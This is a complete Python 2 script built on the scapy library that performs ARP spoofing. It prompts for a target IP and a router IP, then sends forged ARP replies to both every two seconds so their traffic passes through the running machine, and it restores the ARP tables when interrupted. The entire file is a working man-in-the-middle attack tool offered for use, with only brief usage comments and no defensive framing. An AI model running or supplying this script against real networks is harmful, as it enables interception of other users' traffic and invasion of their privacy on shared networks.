#!/usr/bin/env python

# This only works in python2 or lower
# to view the ARP attributes list, go to terminal and start python prompt
# then enter - import scapy.all as scapy   and the enter scapy.ls(scapy.ARP)


import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    return answered_list[0][1].hwsrc



def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

target_ip = raw_input("Enter Targets IP: ")
gateway_ip = raw_input("Enter Router IP: ")

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets Sent: " + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except IndexError:
    pass
except KeyboardInterrupt:
    print("[+] Detected CTRL + C ... Resetting ARP tables.... Please wait. \n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)